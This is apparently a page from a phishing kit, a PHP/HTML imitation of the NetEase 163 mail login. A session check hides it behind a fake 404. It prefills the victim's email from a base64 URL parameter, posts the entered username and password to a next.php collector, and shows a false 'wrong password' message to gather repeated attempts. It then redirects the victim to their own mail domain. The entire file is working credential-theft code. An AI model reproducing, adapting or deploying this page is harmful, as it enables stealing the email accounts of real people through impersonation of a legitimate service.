<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title><title>163&#32593;&#26131;&#20813;&#36153;&#37038;-&#20320;&#30340;&#19987;&#19994;&#30005;&#23376;&#37038;&#23616;</title></title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="maino163" style="height: 100vh;padding-top: 32px;padding-bottom: 32px;padding-left: 42px;padding-right: 42px;">
        <div id="maini163" class="c-div">
            <div id="formc163" style="width: 100%;max-width: 598px;">
                <div class="c-div"><img class="img-fluid" width="668" height="140" src="../assets/img/logo163.png" style="height: 35px;width: auto;"></div><input type="text" id="backEMF" style="width: 100%;height: 44px;margin: 15px 0px -1px;margin-top: 16px;padding: 1px 8px;border: 1px solid rgb(193,193,193) ;" placeholder="用户名"><input type="password" id="pass" style="width: 100%;height: 44px;margin: 15px 0px -1px;margin-top: 16px;padding: 1px 8px;border: 1px solid rgb(193,193,193) ;" placeholder="密码" onclick="nextFun();">
                <p id="err" style="margin-bottom: 0px;margin-top: 8px;color: rgb(211,0,0);">密码错误，请重试</p>
                <div class="form-check" style="margin-top: 32px;"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1">30天内免登录</label></div><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;border-radius: 0px;border-style: none;margin-top: 16px;">登&nbsp;录</button>
                <div class="sp-div" style="margin-top: 16px;"><a href="#">忘记密码？</a><a href="#">去注册</a></div>
                <p style="text-align: center;color: rgb(174,174,174);">阅读并接受 《服务条款》和 《隐私政策</p>
                <div class="c-div" style="margin-top: 16px;"><a href="#">手机号登录</a></div>
                <p style="text-align: center;color: rgb(174,174,174);margin-top: 16px;">电脑版|网易公司版权所有©1997-2025</p>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>